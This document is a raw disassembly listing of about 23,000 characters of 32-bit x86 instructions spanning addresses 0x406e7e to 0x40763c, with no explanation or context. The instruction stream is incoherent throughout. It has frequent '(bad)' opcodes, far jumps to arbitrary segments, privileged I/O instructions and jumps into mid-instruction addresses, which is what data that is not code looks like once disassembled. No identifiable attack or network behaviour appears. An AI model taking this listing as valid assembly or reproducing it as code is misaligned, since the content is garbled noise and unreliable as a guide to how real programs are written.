  406e7e:	mov    dl,0xac
  406e80:	inc    ebx
  406e81:	jg     0x406eff
  406e83:	push   ss
  406e84:	push   0x7c
  406e86:	sub    cl,BYTE PTR [ebx-0x25]
  406e89:	add    dl,BYTE PTR [ebp+0x66]
  406e8c:	sbb    DWORD PTR [ebp-0x6bde0e6],edx
  406e92:	bound  ecx,QWORD PTR [ebx]
  406e94:	cwde   
  406e95:	add    al,0x97
  406e97:	jp     0x406ec8
  406e99:	and    cl,bl
  406e9b:	ffree  st(7)
  406e9d:	xor    bh,BYTE PTR [ebx]
  406e9f:	je     0x406ebd
  406ea1:	(bad)  
  406ea2:	xchg   ecx,eax
  406ea3:	sti    
  406ea4:	sub    BYTE PTR [edi-0x644e795],bh
  406eaa:	and    dh,cl
  406eac:	jo     0x406ed0
  406eae:	fcmovbe st,st(6)
  406eb0:	and    DWORD PTR [ebp-0x6da4a0a3],ecx
  406eb6:	das    
  406eb7:	adc    BYTE PTR [eax],bl
  406eb9:	dec    esi
  406eba:	adc    DWORD PTR [ecx],esi
  406ebc:	fsubr  st,st(6)
  406ebe:	mov    ecx,0x1e084ffe
  406ec3:	xchg   esp,eax
  406ec4:	cld    
  406ec5:	xchg   esi,eax
  406ec6:	mov    ah,0x5e
  406ec8:	cmc    
  406ec9:	fadd   st(6),st
  406ecb:	pop    edx
  406ecc:	repnz or BYTE PTR [eax],bl
  406ecf:	ficomp WORD PTR [edi+0x3f]
  406ed2:	xchg   edx,eax
  406ed3:	and    eax,0xbdbc2861
  406ed8:	pop    ss
  406ed9:	ror    DWORD PTR [ecx-0x11],cl
  406edc:	inc    ebx
  406edd:	sbb    DWORD PTR [edi+0x15],edx
  406ee0:	jmp    0xc57e:0x6f29f630
  406ee7:	cmp    eax,0x88377d15
  406eec:	scas   eax,DWORD PTR es:[edi]
  406eed:	ins    BYTE PTR es:[edi],dx
  406eee:	xchg   DWORD PTR [eax-0x14],ecx
  406ef1:	or     al,0xe
  406ef3:	enter  0x51d0,0x50
  406ef7:	fidivr DWORD PTR [edi-0x6e571b4d]
  406efd:	into   
  406efe:	sub    eax,0x4111a7e5
  406f03:	je     0x406efb
  406f05:	cmp    BYTE PTR [ebx+0x59],ch
  406f08:	je     0x406eaf
  406f0a:	xor    DWORD PTR [edx+ecx*8-0x72e5db7c],esi
  406f11:	xchg   edi,eax
  406f12:	adc    BYTE PTR ds:0x8ef27760,0xb1
  406f19:	xlat   BYTE PTR ds:[ebx]
  406f1b:	(bad)
  406f1f:	pop    eax
  406f20:	mov    edi,edi
  406f22:	mov    BYTE PTR [ebp+0x1d],0x6f
  406f26:	xchg   esp,eax
  406f27:	sti    
  406f28:	ss scas al,BYTE PTR es:[edi]
  406f2a:	in     eax,0x76
  406f2c:	mov    ch,0xb3
  406f2e:	scas   al,BYTE PTR es:[edi]
  406f2f:	fwait
  406f30:	aam    0x98
  406f32:	popa   
  406f33:	cmp    al,0x7f
  406f35:	ins    DWORD PTR es:[edi],dx
  406f36:	fs test eax,0xd81dfd0b
  406f3c:	mov    BYTE PTR [esi+0x4fd17dc0],ch
  406f42:	add    esi,DWORD PTR [esi]
  406f44:	xchg   ebp,eax
  406f45:	loop   0x406f12
  406f47:	popa   
  406f48:	or     eax,0x5a3685e7
  406f4d:	(bad)  
  406f4e:	pop    ecx
  406f4f:	sub    esi,DWORD PTR [eax]
  406f51:	cwde   
  406f52:	xchg   esi,eax
  406f53:	sub    eax,0x88381cca
  406f58:	or     bl,dh
  406f5a:	mov    ah,BYTE PTR [ecx+ebx*1]
  406f5d:	hlt    
  406f5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f5f:	popf   
  406f60:	sbb    al,0x46
  406f62:	mov    eax,ds:0xf6202227
  406f67:	ret    0xe2ff
  406f6a:	pop    es
  406f6b:	pop    ebx
  406f6c:	fnstcw WORD PTR [ebx-0x3b]
  406f6f:	outs   dx,DWORD PTR ds:[esi]
  406f70:	enter  0x647b,0xb6
  406f74:	pop    es
  406f75:	jmp    0x406f62
  406f77:	rcl    BYTE PTR [eax+0x2],0x61
  406f7b:	jnp    0x406f55
  406f7d:	mov    ah,0x92
  406f7f:	jb     0x406ff9
  406f81:	adc    al,0xa9
  406f83:	inc    esp
  406f84:	fs pop ss
  406f86:	out    0x73,al
  406f88:	add    ebp,ebp
  406f8a:	sar    DWORD PTR ss:[edx+esi*2+0xef836c8],0xe5
  406f93:	retf   0xb63f
  406f96:	sti    
  406f97:	xor    edx,esi
  406f99:	call   0x26c64e0c
  406f9e:	clc    
  406f9f:	push   cs
  406fa0:	je     0x406fdc
  406fa2:	mov    esi,0x5d706c5
  406fa7:	cmp    dh,cl
  406fa9:	add    eax,0x3225adee
  406fae:	retf   0x68eb
  406fb1:	jno    0x406f92
  406fb3:	xor    ebx,DWORD PTR [ecx-0x3dcb6c91]
  406fb9:	push   cs
  406fba:	int    0x8
  406fbc:	cmp    al,0xce
  406fbe:	sbb    dh,bl
  406fc0:	or     eax,0x1c27d04a
  406fc5:	inc    esp
  406fc6:	mov    dh,0xce
  406fc8:	mov    BYTE PTR [ecx-0x28efb299],cl
  406fce:	mov    cl,0x87
  406fd0:	out    0x36,al
  406fd2:	stos   BYTE PTR es:[edi],al
  406fd3:	test   ch,cl
  406fd5:	clc    
  406fd6:	xlat   BYTE PTR ds:[ebx]
  406fd7:	inc    DWORD PTR [esi+0x39]
  406fda:	lods   eax,DWORD PTR ds:[esi]
  406fdb:	jae    0x406ff0
  406fdd:	adc    DWORD PTR [ebx],esp
  406fdf:	push   edi
  406fe0:	cmp    ecx,ebx
  406fe2:	jl     0x406fc8
  406fe4:	fdivp  st(3),st
  406fe6:	ds fldcw WORD PTR ss:[ebx+0x5dd1e65b]
  406fee:	dec    esi
  406fef:	and    DWORD PTR [ecx],ecx
  406ff1:	adc    eax,0xd2524a8a
  406ff6:	push   eax
  406ff7:	push   edi
  406ff8:	push   esi
  406ff9:	cs pop ebp
  406ffb:	stos   DWORD PTR es:[edi],eax
  406ffc:	mov    ds:0x5fc48a3a,eax
  407001:	js     0x407063
  407003:	dec    esi
  407004:	jne    0x406fd0
  407006:	hlt    
  407007:	xchg   esi,eax
  407008:	mov    esp,0x45bdd613
  40700d:	nop
  40700e:	sub    DWORD PTR [ebx],edx
  407010:	mov    BYTE PTR [ecx-0x5c3471ca],bl
  407016:	mov    BYTE PTR [edx+0x4710c19b],ch
  40701c:	mov    dh,0xc5
  40701e:	pushf  
  40701f:	mov    al,0x3b
  407021:	inc    ebx
  407022:	xor    BYTE PTR [edx],0xd7
  407025:	rol    BYTE PTR [ebp-0x7e26867a],1
  40702b:	cwde   
  40702c:	pop    ebp
  40702d:	ins    BYTE PTR es:[edi],dx
  40702e:	je     0x406fc1
  407030:	cmp    esi,ebp
  407032:	neg    BYTE PTR [edx+0x0]
  407035:	loop   0x407064
  407037:	inc    ecx
  407038:	lahf   
  407039:	popf   
  40703a:	das    
  40703b:	jbe    0x4070ad
  40703d:	and    BYTE PTR [edi+0x6a],bh
  407040:	sub    eax,0x52ffeacb
  407045:	jne    0x407064
  407047:	nop
  407048:	icebp  
  407049:	les    ecx,FWORD PTR [eax]
  40704b:	outs   dx,BYTE PTR ds:[esi]
  40704c:	jb     0x407099
  40704e:	jmp    0x40704d
  407050:	mov    dh,0xd8
  407052:	dec    ebx
  407053:	aam    0x3a
  407055:	mov    dl,0x96
  407057:	add    BYTE PTR [edx+0x47],bh
  40705a:	mov    ecx,0xa0f31b55
  40705f:	jmp    0x1a41:0xe19a2f4c
  407066:	push   0x3a
  407068:	add    eax,0x7b0b6fe0
  40706d:	arpl   WORD PTR ds:0x3d517289,cx
  407073:	or     al,0x90
  407075:	pop    ecx
  407076:	test   eax,0x831c7333
  40707b:	out    0xd4,eax
  40707d:	mov    bh,BYTE PTR [ecx]
  40707f:	aaa    
  407080:	mov    edi,0x48dee1cb
  407085:	mov    dh,0x70
  407087:	xor    al,0xff
  407089:	std    
  40708a:	aad    0xfa
  40708c:	out    0x69,al
  40708e:	mov    cl,0x55
  407090:	push   0x7d8c2c6f
  407095:	dec    edx
  407096:	dec    ebx
  407097:	fs ret 
  407099:	or     ch,BYTE PTR ds:0x183bed8c
  40709f:	sub    ah,0x2f
  4070a2:	adc    esi,ebx
  4070a4:	loope  0x407026
  4070a6:	(bad)  
  4070a9:	push   ebp
  4070aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070ab:	sti    
  4070ac:	lods   al,BYTE PTR ds:[esi]
  4070ad:	ds pop ecx
  4070af:	repnz cmp cl,BYTE PTR [esi+0x41]
  4070b3:	ss int3 
  4070b5:	retf   
  4070b6:	cld    
  4070b7:	pop    es
  4070b8:	imul   ebx,ebp,0x955dd96d
  4070be:	or     BYTE PTR [ebp-0x1da3bde2],bh
  4070c4:	fcomi  st,st(6)
  4070c6:	cmp    DWORD PTR [ebx-0x6e],edi
  4070c9:	adc    BYTE PTR [eax-0x54],ch
  4070cc:	enter  0xbd12,0xe2
  4070d0:	mov    cl,0xac
  4070d2:	jmp    0xe923:0x6afc6375
  4070d9:	sub    eax,0x195bfa21
  4070de:	jle    0x407116
  4070e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070e1:	into   
  4070e2:	xor    al,0xba
  4070e4:	pop    eax
  4070e5:	mov    ebx,0xd89c0d56
  4070ea:	in     eax,0xcb
  4070ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070ed:	ja     0x4070e0
  4070ef:	cld    
  4070f0:	or     DWORD PTR [esi+0x6bbe9533],0xbadb419e
  4070fa:	out    dx,al
  4070fb:	pop    ds
  4070fc:	dec    esp
  4070fd:	inc    ebp
  4070fe:	retf   
  4070ff:	ret    0xdef4
  407102:	jmp    0x397e:0x9a63ee7e
  407109:	cmp    dh,0xdd
  40710c:	xlat   BYTE PTR ds:[ebx]
  40710d:	es push 0xb
  407110:	lods   eax,DWORD PTR ds:[esi]
  407111:	jo     0x40712b
  407113:	test   BYTE PTR [ecx-0x74394032],0xf6
  40711a:	fild   WORD PTR [ebp+0x52]
  40711d:	fcomi  st,st(2)
  40711f:	mov    dh,0x50
  407121:	and    DWORD PTR [esi-0x703149a6],ecx
  407127:	jo     0x4070ff
  407129:	in     eax,0x63
  40712b:	aaa    
  40712c:	sbb    DWORD PTR [eax-0x77],edx
  40712f:	dec    edi
  407130:	or     ebx,DWORD PTR ss:0x87c0b070
  407137:	xchg   BYTE PTR [edx+0x68],cl
  40713a:	cmp    ebp,edx
  40713c:	in     al,0x61
  40713e:	loope  0x407175
  407140:	xchg   edx,eax
  407141:	mov    ss,WORD PTR [edi+0x59868ea6]
  407147:	pop    edx
  407148:	es jb  0x407184
  40714b:	push   ecx
  40714c:	xchg   ebx,eax
  40714d:	mov    ecx,0x7469f3f
  407152:	aaa    
  407153:	jnp    0x4071b7
  407155:	jns    0x40711e
  407157:	pushf  
  407158:	mov    ebx,DWORD PTR [esi]
  40715a:	xor    al,0x0
  40715c:	mov    al,ds:0xa71a1f2e
  407161:	sbb    ecx,DWORD PTR ds:0xc29aa722
  407167:	push   esi
  407168:	inc    edx
  407169:	or     cl,BYTE PTR [eax]
  40716b:	xor    BYTE PTR [eax+0x26],0xa3
  40716f:	test   dl,al
  407171:	fwait
  407172:	ret    
  407173:	add    eax,0x70f66672
  407178:	jp     0x4071d2
  40717a:	pop    edi
  40717b:	mov    bl,0x4c
  40717d:	rcl    BYTE PTR [ebx-0x3d],0xcd
  407181:	adc    al,0xd7
  407183:	mov    ecx,0xc3c485f3
  407188:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407189:	push   eax
  40718a:	sbb    al,0x67
  40718c:	mov    bl,0x56
  40718e:	xor    edi,ecx
  407190:	or     BYTE PTR [ecx-0x6fd2dcb9],dh
  407196:	jle    0x40711e
  407198:	dec    esi
  407199:	mov    edi,0xfb7a2934
  40719e:	dec    ebp
  40719f:	outs   dx,BYTE PTR ds:[esi]
  4071a0:	add    ch,BYTE PTR [edi+0x45]
  4071a3:	aas    
  4071a4:	adc    eax,DWORD PTR [ebp-0x64]
  4071a7:	scas   al,BYTE PTR es:[edi]
  4071a8:	push   ebp
  4071a9:	mov    dh,0xaa
  4071ab:	dec    eax
  4071ac:	sub    DWORD PTR ds:0x8ec534d8,edi
  4071b2:	jecxz  0x4071e1
  4071b4:	mov    bh,BYTE PTR [edx-0x3bc7aeb7]
  4071ba:	sahf   
  4071bb:	pusha  
  4071bc:	sahf   
  4071bd:	(bad)  
  4071be:	loope  0x4071b3
  4071c0:	mov    ch,0x2
  4071c2:	jmp    0x407209
  4071c4:	push   ds
  4071c5:	jbe    0x407188
  4071c7:	cwde   
  4071c8:	mov    esi,0x47db40cf
  4071cd:	cs inc ecx
  4071cf:	ins    BYTE PTR es:[edi],dx
  4071d0:	mov    eax,ds:0x59d4866
  4071d5:	pushf  
  4071d6:	jns    0x407202
  4071d8:	sub    DWORD PTR [edx],esp
  4071da:	loope  0x4071e4
  4071dc:	fadd   DWORD PTR [ebp+eax*4+0x1370157]
  4071e3:	push   cs
  4071e4:	aaa    
  4071e5:	xchg   ebx,eax
  4071e6:	ds push ebp
  4071e8:	daa    
  4071e9:	cdq    
  4071ea:	adc    BYTE PTR [ecx+ebx*8],al
  4071ed:	push   0xab694e6e
  4071f2:	pop    ss
  4071f3:	add    DWORD PTR [esp+ecx*4-0xb],ecx
  4071f7:	dec    esi
  4071f8:	add    al,0xd
  4071fa:	sub    bh,BYTE PTR [ebp+0x62]
  4071fd:	lea    esp,[edx+0xef31b6e]
  407203:	jp     0x4071a9
  407205:	or     dl,BYTE PTR [ebx+0x2cad8a25]
  40720b:	push   edx
  40720c:	cmp    eax,0x4f3395d2
  407211:	jmp    0x407233
  407213:	push   0x24
  407215:	mov    dl,0x18
  407217:	fs aam 0xc
  40721a:	popa   
  40721b:	aaa    
  40721c:	mov    ds:0x6d5a46e1,al
  407221:	cmp    DWORD PTR [ebp-0x44459168],edi
  407227:	lods   eax,DWORD PTR ds:[esi]
  407228:	daa    
  407229:	and    eax,0xf1c13ad5
  40722e:	in     eax,dx
  40722f:	sbb    eax,0x6d61eab1
  407234:	shl    BYTE PTR [edx],cl
  407236:	mov    esi,0x2da66764
  40723b:	in     eax,0xe9
  40723d:	int    0x89
  40723f:	data16 jmp 0x407247
  407242:	arpl   WORD PTR [esp+ebx*2+0x4fac2550],ax
  407249:	jae    0x4071fc
  40724b:	out    dx,eax
  40724c:	into   
  40724d:	(bad)  
  40724e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40724f:	xor    ebp,edi
  407251:	push   ss
  407252:	jno    0x4072b4
  407254:	and    DWORD PTR [edi+0x4cc2365a],esi
  40725a:	inc    esp
  40725b:	arpl   WORD PTR [ecx+0x32b3b65e],sp
  407261:	adc    eax,0xee952d74
  407266:	ret    0x55dc
  407269:	jno    0x407209
  40726b:	cli    
  40726c:	sub    ebx,DWORD PTR [esp+ecx*4]
  40726f:	sbb    bh,BYTE PTR [ebx-0x656caea4]
  407275:	mov    edx,0x76af6550
  40727a:	cmp    ecx,ebp
  40727c:	out    dx,eax
  40727d:	pop    ds
  40727e:	dec    BYTE PTR [edx+0x16]
  407281:	xchg   ebx,eax
  407282:	js     0x407284
  407284:	push   0xc6a761e5
  407289:	pop    esi
  40728a:	mov    DWORD PTR [edx+ebx*1-0x4f26e3b5],edi
  407291:	mov    ebp,0x32a4981b
  407296:	mov    ecx,0x67c04936
  40729b:	or     DWORD PTR [edx-0x1f],eax
  40729e:	sub    eax,0x6d3f1f4a
  4072a3:	mov    bh,0xf
  4072a5:	cmp    BYTE PTR [edi+eax*4],cl
  4072a8:	(bad)  
  4072aa:	test   edx,eax
  4072ac:	std    
  4072ad:	(bad)  
  4072ae:	sti    
  4072af:	xchg   ebx,eax
  4072b0:	pop    ecx
  4072b1:	sti    
  4072b2:	mov    ecx,0xf6480377
  4072b7:	arpl   WORD PTR [edi+esi*2+0x2c3200d0],cx
  4072be:	cmc    
  4072bf:	les    edx,FWORD PTR [ebp+0x2d]
  4072c2:	clc    
  4072c3:	add    al,0x87
  4072c5:	fnstsw WORD PTR [esi+ebx*1]
  4072c8:	xor    BYTE PTR [edi-0x52b8ee07],ch
  4072ce:	inc    eax
  4072cf:	xor    al,0xfd
  4072d1:	xchg   esi,eax
  4072d2:	xchg   esi,eax
  4072d3:	cs mov al,0x83
  4072d6:	sub    bh,BYTE PTR [esi-0x74f4fc2e]
  4072dc:	push   0xffffffb5
  4072de:	fdiv   QWORD PTR [edi-0x72416af8]
  4072e4:	mov    ecx,0xecc5c698
  4072e9:	cld    
  4072ea:	das    
  4072eb:	lds    edx,FWORD PTR [ebx-0x255658b8]
  4072f1:	adc    al,0x6d
  4072f3:	nop
  4072f4:	mov    bl,0x7a
  4072f6:	fild   DWORD PTR [esi+0x2c014ab6]
  4072fc:	shl    ah,0xff
  4072ff:	jp     0x4072d3
  407301:	sbb    DWORD PTR ds:0xdaed124b,ebx
  407307:	and    DWORD PTR ds:0x1c6cbba6,0xfffffff5
  40730e:	xor    DWORD PTR [edx+esi*8-0x80],edi
  407312:	mov    ecx,0xcf08235c
  407317:	add    BYTE PTR [edx-0x5dd4187e],0x89
  40731e:	mov    al,ds:0xfec4511f
  407323:	mov    ebp,0x977c3f40
  407328:	inc    esi
  407329:	adc    DWORD PTR [edx+eax*8],eax
  40732c:	jmp    0x8d0f:0xc2c60320
  407333:	int3   
  407334:	jg     0x40735e
  407336:	call   0xe211afed
  40733b:	hlt    
  40733c:	out    dx,eax
  40733d:	xchg   edx,eax
  40733e:	jge    0x4073a4
  407340:	jne    0x40739c
  407342:	mov    dl,0x3e
  407344:	scas   al,BYTE PTR es:[edi]
  407345:	retf   0x399b
  407348:	(bad)  
  407349:	cs sti 
  40734b:	retf   
  40734c:	jmp    0x4073cb
  40734e:	or     al,0x69
  407350:	pop    esp
  407351:	push   0x7a
  407353:	cmp    bl,BYTE PTR [edi+edi*4]
  407356:	ins    BYTE PTR es:[edi],dx
  407357:	hlt    
  407358:	mov    al,0xdb
  40735a:	je     0x40736c
  40735c:	mov    bh,0x0
  40735e:	push   0x780f872
  407363:	jae    0x407334
  407365:	outs   dx,BYTE PTR ds:[esi]
  407366:	cmp    BYTE PTR es:[ebx-0x6a],dl
  40736a:	popa   
  40736b:	cs stos BYTE PTR es:[edi],al
  40736d:	jb     0x407392
  40736f:	jp     0x4073a5
  407371:	push   ebp
  407372:	cmp    DWORD PTR [esi-0x48b92212],edx
  407378:	pop    edx
  407379:	pop    esi
  40737a:	fiadd  WORD PTR [esi]
  40737c:	xor    eax,0x541c3af7
  407381:	add    eax,0x3b34b5d8
  407386:	cmp    DWORD PTR [esi-0x25],esi
  407389:	mov    fs,WORD PTR [ebx-0x16fe9253]
  40738f:	outs   dx,DWORD PTR ds:[esi]
  407390:	enter  0x942f,0xb5
  407394:	loop   0x4073e8
  407396:	call   0x8f81fc49
  40739b:	in     al,dx
  40739c:	adc    al,BYTE PTR [esi+0x7198bf43]
  4073a2:	ret    
  4073a3:	aam    0x9f
  4073a5:	push   0x38
  4073a7:	push   eax
  4073a8:	or     eax,0xf7b09c68
  4073ad:	(bad)  [ecx+0x5031ce28]
  4073b3:	cwde   
  4073b4:	jne    0x407373
  4073b6:	outs   dx,BYTE PTR ds:[esi]
  4073b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073b8:	pminsw mm3,mm7
  4073bb:	ret    
  4073bc:	mov    dh,0x36
  4073be:	inc    eax
  4073bf:	(bad)  
  4073c0:	leave  
  4073c1:	and    eax,0xa00fb613
  4073c6:	push   edx
  4073c7:	loop   0x40740e
  4073c9:	inc    ebp
  4073ca:	ins    BYTE PTR es:[edi],dx
  4073cb:	mov    al,0x35
  4073cd:	and    BYTE PTR [ecx],ch
  4073cf:	xchg   DWORD PTR [ecx-0x31],ecx
  4073d2:	pop    ds
  4073d3:	fsub   QWORD PTR [ebx-0x3d]
  4073d6:	mov    WORD PTR [eax],gs
  4073d8:	es out dx,al
  4073da:	test   DWORD PTR [esi-0x6b],0x28a43e0d
  4073e1:	into   
  4073e2:	adc    dl,BYTE PTR [ebp+eax*8-0x35]
  4073e6:	or     ecx,DWORD PTR [edx+ebx*8-0x1c0424ae]
  4073ed:	sub    al,0xac
  4073ef:	mov    WORD PTR [esi+eax*1-0x63],fs
  4073f3:	js     0x4073b7
  4073f5:	stos   BYTE PTR es:[edi],al
  4073f6:	dec    ecx
  4073f7:	push   es
  4073f8:	mov    dh,0xba
  4073fa:	mov    esi,0x9ed1e78f
  4073ff:	mov    edx,0x9153483f
  407404:	dec    ebp
  407405:	or     eax,0x1df11e2d
  40740a:	scas   eax,DWORD PTR es:[edi]
  40740b:	xchg   edx,eax
  40740c:	ins    BYTE PTR es:[edi],dx
  40740d:	cmp    al,0x44
  40740f:	push   esi
  407410:	dec    eax
  407411:	pop    edi
  407412:	adc    DWORD PTR [ecx+esi*1-0x5e],edx
  407416:	shl    BYTE PTR [ebp-0x5a],cl
  407419:	ret    
  40741a:	push   ss
  40741b:	daa    
  40741c:	lahf   
  40741d:	sbb    DWORD PTR [esi+ebp*2-0x5697af71],0xa2e5548f
  407428:	fdivp  st(4),st
  40742a:	mov    ebp,0xc722943d
  40742f:	fbstp  TBYTE PTR [edx+0x52b518]
  407435:	sub    dh,BYTE PTR [eax+0x42dc108c]
  40743b:	ja     0x40742a
  40743d:	or     eax,0x9445187c
  407442:	mov    esp,0x2dabba41
  407447:	(bad)  
  407448:	xchg   ecx,eax
  407449:	xor    DWORD PTR [edi],0xffffffe2
  40744c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40744d:	cmp    BYTE PTR [ecx-0x66],cl
  407450:	lds    esi,FWORD PTR [eax]
  407452:	mov    bl,BYTE PTR [ecx+0x36]
  407455:	sub    ebp,esi
  407457:	jp     0x4073de
  407459:	mov    dl,0x5a
  40745b:	stos   BYTE PTR es:[edi],al
  40745c:	ja     0x407472
  40745e:	adc    ecx,DWORD PTR [ebp+0x6d265703]
  407464:	pop    es
  407465:	dec    edx
  407466:	and    edx,edi
  407468:	dec    ebx
  407469:	jo     0x4074db
  40746b:	dec    esp
  40746c:	push   0x1b6b846f
  407471:	xor    DWORD PTR [edi],0xffffff8b
  407474:	test   eax,0xceabc73c
  407479:	push   esp
  40747a:	fs jmp 0x407418
  40747d:	add    DWORD PTR [esi-0x4d],eax
  407480:	test   BYTE PTR [ebx+0xd1cb83b],0x5e
  407487:	xchg   BYTE PTR [bp+0x3c],dh
  40748b:	fisubr DWORD PTR [edx-0x7d68ad1a]
  407491:	dec    esp
  407492:	cmc    
  407493:	add    eax,0x845a0b2e
  407498:	xor    BYTE PTR [ebx],bh
  40749a:	scas   eax,DWORD PTR es:[edi]
  40749b:	cmp    bh,BYTE PTR [ebx]
  40749d:	push   edi
  40749e:	mov    eax,ds:0x2a42b727
  4074a3:	shld   DWORD PTR [edx],eax,0x9e
  4074a7:	adc    bh,BYTE PTR [ebx+edx*4]
  4074aa:	ins    DWORD PTR es:[edi],dx
  4074ab:	sub    al,0x6d
  4074ad:	mov    edx,0xc1f10343
  4074b2:	mov    edx,0xc44db5ce
  4074b7:	pop    esi
  4074b8:	data16 icebp 
  4074ba:	xchg   ebx,eax
  4074bb:	jmp    FWORD PTR [edx+0x53]
  4074be:	nop
  4074bf:	cmp    eax,0x3d7bd12e
  4074c4:	mov    WORD PTR [ebp-0x7728170d],?
  4074ca:	loopne 0x407518
  4074cc:	pop    esi
  4074cd:	jnp    0x407494
  4074cf:	ss retf 
  4074d1:	stc    
  4074d2:	jmp    0x7f10e654
  4074d7:	leave  
  4074d8:	adc    esp,DWORD PTR [ecx+0x5c]
  4074db:	push   ebx
  4074dc:	adc    eax,0xec16b6ab
  4074e1:	imul   edx,esp,0xfffffff1
  4074e4:	adc    ecx,DWORD PTR [ecx]
  4074e6:	fs xchg edx,eax
  4074e8:	pop    edx
  4074e9:	jo     0x4074c1
  4074eb:	fldcw  WORD PTR [ecx+edi*8-0x6c]
  4074ef:	mov    ecx,0x19a20a09
  4074f4:	lods   eax,DWORD PTR ds:[esi]
  4074f5:	sbb    eax,0xf25390af
  4074fa:	lods   al,BYTE PTR ds:[esi]
  4074fb:	mov    ecx,0x6d1f2991
  407500:	and    al,0x56
  407502:	xor    bl,al
  407504:	sbb    eax,0xc0fb3ffa
  407509:	dec    edi
  40750a:	daa    
  40750b:	mov    cl,0xa7
  40750d:	xchg   esp,eax
  40750e:	cmp    eax,0x3f81ca20
  407513:	add    BYTE PTR [eax],bh
  407515:	mov    ecx,0x166f3c8d
  40751a:	pop    ds
  40751b:	jmp    0x112e228f
  407520:	fwait
  407521:	and    cl,BYTE PTR [eax-0x59c0690a]
  407527:	pop    ss
  407528:	jg     0x40756d
  40752a:	add    BYTE PTR [eax-0x2e],0xde
  40752e:	mov    ah,0xc0
  407530:	or     BYTE PTR [eax+0x463b0176],dl
  407536:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407537:	cli    
  407538:	xchg   edi,eax
  407539:	or     al,0x99
  40753b:	fwait
  40753c:	inc    edx
  40753d:	xor    eax,0x5232f04d
  407542:	inc    esi
  407543:	aam    0x64
  407545:	stos   BYTE PTR es:[edi],al
  407546:	pop    ecx
  407547:	jle    0x4074ce
  407549:	jae    0x4075c2
  40754b:	(bad)  
  40754c:	sbb    edx,DWORD PTR [edi+0x29bf4d46]
  407552:	xor    edx,eax
  407554:	(bad)  
  407555:	cmp    DWORD PTR [ebp-0x3149f8e7],edx
  40755b:	jno    0x407556
  40755d:	mov    dl,0xd7
  40755f:	inc    esp
  407560:	fbstp  TBYTE PTR [edx+0x20a15a28]
  407566:	dec    ecx
  407567:	mov    esi,0x516fb607
  40756c:	push   edx
  40756d:	sahf   
  40756e:	cmp    BYTE PTR [ebx-0x3530cf24],dl
  407574:	aam    0x77
  407576:	xor    DWORD PTR [ecx+esi*4],esi
  407579:	rcl    BYTE PTR [eax+0xa01c5e7],1
  40757f:	mov    ds:0x1ff8891e,al
  407584:	pop    esp
  407585:	ds pop edi
  407587:	(bad)  
  407588:	mov    bh,0x6d
  40758a:	mov    ah,0x50
  40758c:	xchg   ebx,eax
  40758d:	push   ebp
  40758e:	(bad)  
  40758f:	in     al,0xa9
  407591:	sub    al,0xc8
  407593:	loope  0x407582
  407595:	jb     0x40757f
  407597:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407598:	fld    st(4)
  40759a:	pop    eax
  40759b:	and    ah,BYTE PTR [esi+0x39248df9]
  4075a1:	mov    ecx,0x480c0fbd
  4075a6:	or     al,0x20
  4075a8:	xchg   BYTE PTR [edi-0x45],dl
  4075ab:	out    0xe5,eax
  4075ad:	dec    dh
  4075af:	scas   eax,DWORD PTR es:[edi]
  4075b0:	jmp    0x14afc3dc
  4075b5:	jns    0x4075c3
  4075b7:	mov    BYTE PTR [esi],ah
  4075b9:	sahf   
  4075ba:	mov    edi,0x758e7a99
  4075bf:	clc    
  4075c0:	lock and bh,BYTE PTR [edi-0x2a]
  4075c4:	ds inc esp
  4075c6:	mov    al,ds:0x496986ac
  4075cb:	lahf   
  4075cc:	pop    ds
  4075cd:	test   BYTE PTR [esi+0x72ffaf8f],cl
  4075d3:	push   es
  4075d4:	pop    ecx
  4075d5:	mov    eax,ds:0x1a94046a
  4075da:	jge    0x40761b
  4075dc:	xchg   ebp,eax
  4075dd:	(bad)  
  4075de:	dec    eax
  4075df:	loope  0x40760b
  4075e1:	dec    esi
  4075e2:	dec    esp
  4075e3:	stos   BYTE PTR es:[edi],al
  4075e4:	stos   DWORD PTR es:[edi],eax
  4075e5:	push   cs
  4075e6:	pop    es
  4075e7:	dec    esi
  4075e8:	scas   eax,DWORD PTR es:[edi]
  4075e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075ea:	add    al,0xc1
  4075ec:	dec    eax
  4075ed:	push   edx
  4075ee:	cmp    BYTE PTR [ebx+0x4f],bh
  4075f1:	pop    ds
  4075f2:	stos   DWORD PTR es:[edi],eax
  4075f3:	je     0x407582
  4075f5:	aas    
  4075f6:	imul   BYTE PTR [esp+edi*1+0x7c]
  4075fa:	or     al,0x71
  4075fc:	xchg   ebp,eax
  4075fd:	outs   dx,DWORD PTR ds:[esi]
  4075fe:	mov    dl,0xb6
  407600:	out    dx,eax
  407601:	nop
  407602:	int3   
  407603:	xor    ecx,DWORD PTR ds:0xd71090a
  407609:	pusha  
  40760a:	stc    
  40760b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40760c:	imul   edi,DWORD PTR [edi-0x7f],0xffffffc5
  407610:	lea    ecx,[ecx]
  407612:	xlat   BYTE PTR ds:[ebx]
  407613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407614:	pusha  
  407615:	and    DWORD PTR [esi],eax
  407617:	lds    ecx,FWORD PTR [edi]
  407619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40761a:	jmp    0xa8c8:0xc0eec1a7
  407621:	pop    ebp
  407622:	mov    bl,ah
  407624:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407625:	fstp   TBYTE PTR [eax]
  407627:	jns    0x4075c2
  407629:	add    DWORD PTR [ebx],0xffffffb0
  40762c:	cmp    edx,DWORD PTR [ebx]
  40762e:	sbb    ebp,DWORD PTR [ebx]
  407630:	repnz xor BYTE PTR es:[ebx],bh
  407634:	cmp    DWORD PTR [edx],esp
  407636:	xor    ecx,DWORD PTR [ecx+edi*2]
  407639:	in     al,0xd1
  40763b:	stc    
  40763c:	fisubr DWORD PTR [edx-0x3e8bdb7f]
